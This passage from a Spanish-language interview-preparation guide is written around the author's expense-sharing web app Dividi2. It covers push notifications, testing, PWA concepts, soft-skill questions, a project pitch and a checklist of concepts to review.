**Contras:**
- Vendor lock-in: migrar puede ser costoso
- Límites del plan (conexiones, rows, egress)
- Menos control sobre la base de datos
- El costo puede escalar rápido en producción

### ¿Cómo funciona el sistema de notificaciones push del proyecto?

1. El usuario da permiso en el browser (`Notification.requestPermission()`)
2. El browser genera una suscripción con endpoint y claves criptográficas
3. La suscripción se guarda en la tabla `push_subscriptions` de Supabase
4. Cuando alguien crea un gasto, el backend llama a la Edge Function `send-push-notification`
5. La Edge Function firma el mensaje con las claves VAPID y lo envía al endpoint del browser
6. El Service Worker recibe el push y muestra la notificación, incluso si la app está cerrada

**VAPID (Voluntary Application Server Identification):** par de claves pública/privada que identifican al servidor. El browser verifica que la notificación viene del servidor legítimo.

---

## 11. Preguntas de entrevista — Testing

### ¿Qué tipos de tests existen?

1. **Unit tests:** testean una función o módulo de forma aislada (mocks para dependencias)
2. **Integration tests:** testean la interacción entre varios módulos
3. **E2E tests:** simulan un usuario real navegando la app (Playwright, Cypress)
4. **Snapshot tests:** capturan el HTML renderizado de un componente y alertan si cambia

### ¿Qué es TDD (Test-Driven Development)?

Escribir los tests **antes** del código de producción. El ciclo es:
1. Red: escribir un test que falla
2. Green: escribir el mínimo código para que pase
3. Refactor: mejorar el código sin romper el test

**Beneficios:** fuerza a pensar en la interfaz (API) antes de la implementación, garantiza cobertura, facilita refactoring.

### ¿Por qué el proyecto tiene tests para los servicios pero no para los componentes?

**Servicios:** lógica de negocio pura (sin React, sin DB). Son fáciles de testear con inputs y outputs claros. `SummaryService.computeSummaryFromRows()` toma datos y devuelve un resumen, sin efectos secundarios.

**Componentes:** requieren montar React (React Testing Library), mockear Supabase, simular interacciones. Es más costoso y si la lógica está en los servicios, testear los servicios ya da alta confianza.

### ¿Qué es mocking en tests?

Reemplazar una dependencia real (como Supabase) con una implementación falsa que controla los datos devueltos. Así los tests no hacen llamadas reales a la DB y son:
- Rápidos
- Deterministas (siempre el mismo resultado)
- No tienen efectos secundarios

```typescript
// En el test de BalanceCalculator no se necesita mockear nada
// porque la función toma datos directamente, no llama a Supabase
const result = calculateBalances(expenses, splits, settlements)
expect(result).toEqual({ ... })
```

### ¿Qué es Vitest y por qué se usa?

Vitest es un test runner compatible con la API de Jest (misma sintaxis `describe`, `it`, `expect`) pero construido sobre Vite, lo que lo hace mucho más rápido. Puede importar directamente código TypeScript sin transpilar, y tiene HMR para tests en modo watch.

---

## 12. Preguntas de entrevista — PWA & Web APIs

### ¿Qué es un PWA (Progressive Web App)?

Una web app que se comporta como una app nativa. Características:
1. **Instalable:** se puede agregar al home screen del teléfono
2. **Offline:** funciona (parcialmente) sin internet gracias al Service Worker
3. **Push notifications:** recibe notificaciones aunque esté cerrada
4. **Responsive:** funciona bien en cualquier tamaño de pantalla

Requiere: HTTPS, un manifest.json, y un Service Worker registrado.

### ¿Qué es un Service Worker?

Un script JavaScript que corre en background, separado de la página. Intercepta requests de red y puede:
- Servir respuestas desde caché (modo offline)
- Recibir push notifications del servidor
- Sincronizar datos en background

Limitaciones: no tiene acceso al DOM, no puede usar `localStorage`, tiene su propio ciclo de vida (install, activate, fetch).

### ¿Qué es el manifest.json del PWA?

Archivo JSON que le dice al browser cómo mostrar la app cuando se instala:
```json
{
  "name": "Dividi2",
  "short_name": "Dividi2",
  "start_url": "/dashboard",
  "display": "standalone",
  "background_color": "#1e1b4b",
  "theme_color": "#4f46e5",
  "icons": [...]
}
```
`display: "standalone"` hace que se abra sin la barra de URL del browser (como una app nativa).

---

## 13. Preguntas de entrevista — General (soft skills + proceso)

### ¿Por qué elegiste TypeScript sobre JavaScript?

TypeScript agrega tipado estático que:
1. Detecta errores en tiempo de compilación, no en producción
2. Mejora el autocompletado del IDE (sabe qué propiedades tiene cada objeto)
3. Documenta el código (los tipos son documentación viva)
4. Hace el refactoring más seguro (si cambias un tipo, el compilador señala todos los lugares que deben actualizarse)

El overhead de configuración y la curva de aprendizaje se pagan rápidamente en proyectos de más de un mes.

### ¿Qué harías diferente si empezaras el proyecto de cero?

1. **React Query (TanStack Query):** para cacheo de datos y background refetching. Actualmente cada vez que se navega a una página, se refetch todo.
2. **Supabase Realtime:** subscripción a cambios en tiempo real en lugar de hacer refresh manual cuando alguien crea un gasto.
3. **Transacciones reales:** usar Supabase RPC con una función PostgreSQL para crear expense + splits atómicamente.
4. **Más tests de integración:** testear el flujo completo de creación de gastos con la DB real (Supabase local con Docker).

### ¿Cómo manejas conflictos en el código (Git)?

1. Hacer `git pull --rebase` frecuentemente para mantener la rama actualizada
2. Si hay conflictos, entender qué cambió cada lado antes de resolver
3. Para conflictos en archivos generados (lock files), regenerarlos
4. Si el conflicto es complejo, comunicarse con el autor del otro cambio

### ¿Cómo priorizas qué trabajar?

1. Bugs que bloquean usuarios (prioridad máxima)
2. Features del core de negocio
3. Mejoras de UX
4. Refactoring y deuda técnica
5. Features "nice to have"

La clave es no empezar a refactorizar en medio de agregar una feature (mezcla los commits y hace el code review más difícil).

### ¿Cómo explicas una decisión técnica a alguien no técnico?

Usar analogías del mundo real y enfocarse en el impacto en el usuario/negocio, no en los detalles de implementación.

Ejemplo para Supabase: "En lugar de construir nuestra propia cocina desde cero, usamos un servicio de catering que ya tiene todo el equipamiento y el personal. Pagamos por lo que usamos y podemos enfocarnos en el menú en lugar de comprar ollas."

---

## 14. Cómo explicar el proyecto en una entrevista

### Pitch de 30 segundos

> "Dividi2 es una app de gastos compartidos que construí desde cero. Está en producción en dividi2.nicoguzmandev.com. Técnicamente es un Next.js con TypeScript en Vercel, con Supabase como backend (PostgreSQL + Auth). Lo que más me orgullece es la arquitectura: separé la lógica de negocio en una capa de servicios testeable independientemente de React, implementé el patrón Strategy para los tipos de split de gastos, y toda la autorización vive en Row Level Security de PostgreSQL."

### Preguntas probables del entrevistador sobre el proyecto

**"¿Por qué no usaste Redux para el estado?"**
> Para la escala de este proyecto, useState + custom hooks es suficiente y más simple. Redux agrega boilerplate para poco beneficio cuando no tienes estado global muy complejo. Si el proyecto creciera mucho, consideraría Zustand (más liviano que Redux) o React Query para el estado de servidor.

**"¿Cómo garantizas que los balances sean correctos?"**
> El algoritmo está cubierto por unit tests en Vitest. Los tests verifican casos edge: grupo con un solo miembro, gastos donde el pagador tiene el mismo split, múltiples settlements. El diseño del algoritmo también ayuda: solo se suman los `expense_splits.amount` (no el total del gasto), lo que elimina el error más común de doble conteo.

**"¿Qué pasa si dos usuarios crean un gasto al mismo tiempo?"**
> PostgreSQL maneja la concurrencia con MVCC (Multi-Version Concurrency Control). Cada INSERT es atómico. El problema sería si el cálculo de balance en el cliente se desincroniza con la DB, pero como el cliente siempre hace un fresh fetch después de cualquier operación, el estado siempre refleja la DB.

**"¿Cómo manejas los errores?"**
> Try-catch en todas las operaciones async de los servicios. Zod valida antes de llegar a la DB. Los errores de RLS (usuario sin permisos) se capturan y muestran mensajes descriptivos. Los errores de red muestran un mensaje genérico. En producción, agregaría Sentry para monitorear errores no capturados.

**"¿Por qué Vercel y no AWS?"**
> Para un proyecto de esta escala, Vercel elimina toda la complejidad de configurar EC2, load balancers, certificados SSL, y CI/CD. El deploy es automático desde el push. Si el proyecto creciera y necesitáramos más control (VPCs, funciones Lambda complejas, múltiples regiones), consideraría AWS.

---

## Resumen rápido de conceptos para repasar antes de una entrevista

```
□ useState, useEffect, useCallback, useMemo — diferencias y cuándo usar cada uno
□ Custom hooks — por qué y cómo
□ TypeScript generics y utility types (Partial, Pick, Omit, Record)
□ Zod — validación runtime + type inference
□ Next.js SSR vs SSG vs CSR
□ getServerSideProps vs getStaticProps
□ JWT — estructura y validación
□ OAuth 2.0 — flujo de autorización
□ PostgreSQL RLS — cómo funciona
□ ACID y transacciones
□ Strategy Pattern — implementación en splits
□ Service Layer Pattern — por qué separar de React
□ CORS, XSS, CSRF — definición y prevención
□ PWA — Service Worker, manifest, push notifications
□ VAPID — para qué sirve en push notifications
□ Git — rebase vs merge, resolución de conflictos
□ Testing — unit vs integration vs E2E, mocking
```
